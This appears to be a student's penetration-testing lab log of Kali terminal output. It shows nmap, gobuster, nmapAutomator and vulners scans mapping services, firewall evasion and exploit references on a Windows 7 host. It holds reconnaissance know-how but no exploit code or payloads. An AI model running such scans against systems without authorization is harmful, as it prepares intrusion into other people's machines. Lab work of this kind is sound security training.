
># Scan

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀aluno</b></font><font color="#367BF0">)-[</font><b>/home/aluno</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">nmap</font> <font color="#9755B3">-A</font> 192.168.90.80 <font color="#9755B3">-p-</font>            
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-24 15:10 -03
Nmap scan report for 192.168.90.80
Host is up (0.0042s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?
1100/tcp  open  java-rmi     Java RMI
| rmi-dumpregistry: 
|   creamtec/ajaxswing/JVMFactory
|     com.creamtec.ajaxswing.core.JVMFactory_Stub
|     <font color="gold">@192.168.90.80:49157</font>
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
2869/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3306/tcp  open  mysql        MySQL (unauthorized; French)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
<font color="gold">5800/tcp  open  vnc-http     TightVNC (user: 101ciaavl; VNC TCP port: 5900)</font>
|_http-title: TightVNC desktop [101ciaavl]
5900/tcp  open  vnc          VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)
8014/tcp  open  http         Apache httpd
|_http-title: 404 Not Found
|_http-server-header: Apache
8080/tcp  open  http         Apache httpd 2.4.9 ((Win32) PHP/5.5.12)
|_http-server-header: Apache/2.4.9 (Win32) PHP/5.5.12
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/testmysql.php
|_http-title: Site doesn&apos;t have a title (text/html).
10243/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  java-rmi     Java RMI
49159/tcp open  java-rmi     Java RMI
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|8|Vista|2008
OS CPE: cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1
OS details: Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
Network Distance: 6 hops
Service Info: Host: 101CIAAVL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: 101ciaavl
|   NetBIOS computer name: 101CIAAVL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-05-24T18:19:41+00:00
|_clock-skew: mean: 5m13s, deviation: 2s, median: 5m12s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-05-24T18:19:39
|_  start_date: 2022-05-24T17:01:24

TRACEROUTE (using port 3306/tcp)
HOP RTT     ADDRESS
1   0.48 ms 192.168.80.1
2   1.22 ms 192.168.1.2
3   1.20 ms 192.168.1.10
4   2.48 ms 192.168.200.1
5   3.58 ms 192.168.2.70
6   4.80 ms 192.168.90.80

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 298.27 seconds
</pre>

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀aluno</b></font><font color="#367BF0">)-[</font><b>/home/aluno</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">nmap</font> <font color="#9755B3">-Pn</font> <font color="#9755B3">-sV</font> <font color="#9755B3">-g</font> 53 192.168.90.80 <font color="#9755B3">-p-</font> 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-24 15:10 -03
Nmap scan report for 192.168.90.80
Host is up (0.0033s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?
1100/tcp  open  java-rmi           Java RMI
2869/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3306/tcp  open  mysql              MySQL (unauthorized; French)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5800/tcp  open  vnc-http           TightVNC (user: 101ciaavl; VNC TCP port: 5900)
5900/tcp  open  vnc                VNC (protocol 3.8)
8014/tcp  open  http               Apache httpd
8080/tcp  open  http               Apache httpd 2.4.9 ((Win32) PHP/5.5.12)
10243/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  java-rmi           Java RMI
49159/tcp open  java-rmi           Java RMI
Service Info: Host: 101CIAAVL; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.28 seconds
</pre>

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀aluno</b></font><font color="#367BF0">)-[</font><b>/home/aluno</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">gobuster</font> dir <font color="#9755B3">-u</font> http://192.168.90.80:5800 <font color="#9755B3">-w</font> <u style="text-decoration-style:single">/usr/share/wordlists/dirb/big.txt</u>
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.90.80:5800
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/24 15:19:07 Starting gobuster in directory enumeration mode
===============================================================
                                 
===============================================================
2022/05/24 15:19:38 Finished
===============================================================
                                                                                                                       
<font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀aluno</b></font><font color="#367BF0">)-[</font><b>/home/aluno</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">gobuster</font> dir <font color="#9755B3">-u</font> http://192.168.90.80:8080 <font color="#9755B3">-w</font> <u style="text-decoration-style:single">/usr/share/wordlists/dirb/big.txt</u>
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.90.80:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/24 15:20:37 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 301]
/PHP                  (Status: 301) [Size: 328] [--&gt; http://192.168.90.80:8080/PHP/]
/aux                  (Status: 403) [Size: 295]                                     
/cgi-bin/             (Status: 403) [Size: 300]                                     
/com1                 (Status: 403) [Size: 296]                                     
/com2                 (Status: 403) [Size: 296]                                     
/com3                 (Status: 403) [Size: 296]                                     
/com4                 (Status: 403) [Size: 296]                                     
/con                  (Status: 403) [Size: 295]                                     
/favicon.ico          (Status: 200) [Size: 202575]                                  
/lpt1                 (Status: 403) [Size: 296]                                     
/lpt2                 (Status: 403) [Size: 296]                                     
/nul                  (Status: 403) [Size: 295]                                     
/php                  (Status: 301) [Size: 328] [--&gt; http://192.168.90.80:8080/php/]
/phpmyadmin           (Status: 403) [Size: 302]                                     
/phpsysinfo           (Status: 403) [Size: 302]                                     
/prn                  (Status: 403) [Size: 295]                                     
/robots.txt           (Status: 200) [Size: 72]                                      
/secci�               (Status: 403) [Size: 298]                                     
/sqlbuddy             (Status: 403) [Size: 300]                                     
                                                                                    
===============================================================
2022/05/24 15:20:56 Finished
===============================================================
                                                                                                                       
<font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀aluno</b></font><font color="#367BF0">)-[</font><b>/home/aluno</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">gobuster</font> dir <font color="#9755B3">-u</font> http://192.168.90.80:8014 <font color="#9755B3">-w</font> <u style="text-decoration-style:single">/usr/share/wordlists/dirb/big.txt</u>
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.90.80:8014
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/24 15:21:29 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/Content              (Status: 301) [Size: 242] [--&gt; http://192.168.90.80:8014/Content/]
/LICENSE              (Status: 301) [Size: 242] [--&gt; http://192.168.90.80:8014/LICENSE/]
/aux                  (Status: 403) [Size: 205]                                         
/com1                 (Status: 403) [Size: 206]                                         
/com3                 (Status: 403) [Size: 206]                                         
/com2                 (Status: 403) [Size: 206]                                         
/com4                 (Status: 403) [Size: 206]                                         
/con                  (Status: 403) [Size: 205]                                         
/content              (Status: 301) [Size: 242] [--&gt; http://192.168.90.80:8014/content/]
/license              (Status: 301) [Size: 242] [--&gt; http://192.168.90.80:8014/license/]
/lpt1                 (Status: 403) [Size: 206]                                         
/lpt2                 (Status: 403) [Size: 206]                                         
/nul                  (Status: 403) [Size: 205]                                         
/prn                  (Status: 403) [Size: 205]                                         
/reporting            (Status: 301) [Size: 244] [--&gt; http://192.168.90.80:8014/reporting/]
/secci�               (Status: 403) [Size: 208]                                           
                                                                                          
===============================================================
2022/05/24 15:21:48 Finished
===============================================================
</pre>

># nmap auto


<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀aluno</b></font><font color="#367BF0">)-[</font><b>/home/aluno/Downloads/nmapAutomator-master</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">./nmapAutomator.sh</font> 192.168.90.80 all                     

<font color="#FEA44C">Running all scans on </font>192.168.90.80

<font color="#5EBDAB">Host is likely running Unknown OS!</font>


<font color="#5EBDAB">---------------------Starting Port Scan-----------------------</font>



PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
554/tcp   open  rtsp
1100/tcp  open  mctp
2869/tcp  open  icslap
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5800/tcp  open  vnc-http
5900/tcp  open  vnc
8080/tcp  open  http-proxy
10243/tcp open  unknown
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49159/tcp open  unknown



<font color="#5EBDAB">---------------------Starting Script Scan-----------------------</font>



PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?
1100/tcp  open  java-rmi     Java RMI
| rmi-dumpregistry: 
|   creamtec/ajaxswing/JVMFactory
|     com.creamtec.ajaxswing.core.JVMFactory_Stub
|     @192.168.90.80:49157
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
2869/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3306/tcp  open  mysql        MySQL (unauthorized; French)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5800/tcp  open  vnc-http     TightVNC (user: 101ciaavl; VNC TCP port: 5900)
|_http-title: TightVNC desktop [101ciaavl]
5900/tcp  open  vnc          VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)
8080/tcp  open  http         Apache httpd 2.4.9 ((Win32) PHP/5.5.12)
|_http-server-header: Apache/2.4.9 (Win32) PHP/5.5.12
|_http-title: Site doesn&apos;t have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/testmysql.php
|_http-open-proxy: Proxy might be redirecting requests
10243/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  java-rmi     Java RMI
49159/tcp open  java-rmi     Java RMI
Service Info: Host: 101CIAAVL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5m15s, deviation: 2s, median: 5m14s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-26T13:17:43
|_  start_date: 2022-05-26T13:01:35
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: 101ciaavl
|   NetBIOS computer name: 101CIAAVL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-05-26T13:17:44+00:00




<font color="#5EBDAB">---------------------Starting Full Scan------------------------</font>



PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
554/tcp   open  rtsp
1100/tcp  open  mctp
2869/tcp  open  icslap
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5800/tcp  open  vnc-http
5900/tcp  open  vnc
8014/tcp  open  unknown
8080/tcp  open  http-proxy
10243/tcp open  unknown
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49159/tcp open  unknown



<font color="#FEA44C">Making a script scan on extra ports: 8014</font>



PORT     STATE SERVICE VERSION
8014/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 404 Not Found
</pre>

<pre><font color="#5EBDAB">---------------------Starting Vulns Scan-----------------------</font>

<font color="#FEA44C">Running CVE scan on all ports</font>



PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?
1100/tcp  open  java-rmi     Java RMI
2869/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3306/tcp  open  mysql        MySQL (unauthorized; French)
3389/tcp  open  tcpwrapped
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
5800/tcp  open  vnc-http     TightVNC (user: 101ciaavl; VNC TCP port: 5900)
5900/tcp  open  vnc          VNC (protocol 3.8)
8014/tcp  open  http         Apache httpd
|_http-server-header: Apache
8080/tcp  open  http         Apache httpd 2.4.9 ((Win32) PHP/5.5.12)
| vulners: 
|   cpe:/a:apache:http_server:2.4.9: 
|     	E899CC4B-A3FD-5288-BB62-A4201F93FDCC	10.0	https://vulners.com/githubexploit/E899CC4B-A3FD-5288-BB62-A4201F93FDCC	*EXPLOIT*
|     	5DE1B404-0368-5986-856A-306EA0FE0C09	10.0	https://vulners.com/githubexploit/5DE1B404-0368-5986-856A-306EA0FE0C09	*EXPLOIT*
|     	CVE-2022-23943	7.5	https://vulners.com/cve/CVE-2022-23943
|     	CVE-2022-22720	7.5	https://vulners.com/cve/CVE-2022-22720
|     	CVE-2021-44790	7.5	https://vulners.com/cve/CVE-2021-44790
|     	CVE-2021-39275	7.5	https://vulners.com/cve/CVE-2021-39275
|     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
|     	CVE-2017-7679	7.5	https://vulners.com/cve/CVE-2017-7679
|     	CVE-2017-3167	7.5	https://vulners.com/cve/CVE-2017-3167
|     	PACKETSTORM:127546	6.8	https://vulners.com/packetstorm/PACKETSTORM:127546	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2014-0226/	6.8	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2014-0226/	*EXPLOIT*
|     	MSF:ILITIES/FREEBSD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-17790/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-17790/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	*EXPLOIT*
|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
|     	8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	6.8	https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	*EXPLOIT*
|     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	6.8	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	*EXPLOIT*
|     	1337DAY-ID-22451	6.8	https://vulners.com/zdt/1337DAY-ID-22451	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
|     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
|     	SSV:62058	5.0	https://vulners.com/seebug/SSV:62058	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1303/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2014-0231/	5.0	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2014-0231/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-2161/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-2161/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-0736/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-0736/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	*EXPLOIT*
|     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
|     	EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	5.0	https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7	*EXPLOIT*
|     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
|     	EDB-ID:42745	5.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
|     	EDB-ID:40961	5.0	https://vulners.com/exploitdb/EDB-ID:40961	*EXPLOIT*
|     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573	*EXPLOIT*
|     	1337DAY-ID-26574	5.0	https://vulners.com/zdt/1337DAY-ID-26574	*EXPLOIT*
|     	SSV:87152	4.3	https://vulners.com/seebug/SSV:87152	*EXPLOIT*
|     	PACKETSTORM:127563	4.3	https://vulners.com/packetstorm/PACKETSTORM:127563	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1302/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1301/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2014-0118/	4.3	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2014-0118/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-ALAS-2014-389/	4.3	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-ALAS-2014-389/	*EXPLOIT*
|     	MSF:ILITIES/ALPINE-LINUX-CVE-2014-0117/	4.3	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2014-0117/	*EXPLOIT*
|     	4013EC74-B3C1-5D95-938A-54197A58586D	4.3	https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D	*EXPLOIT*
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/	*EXPLOIT*
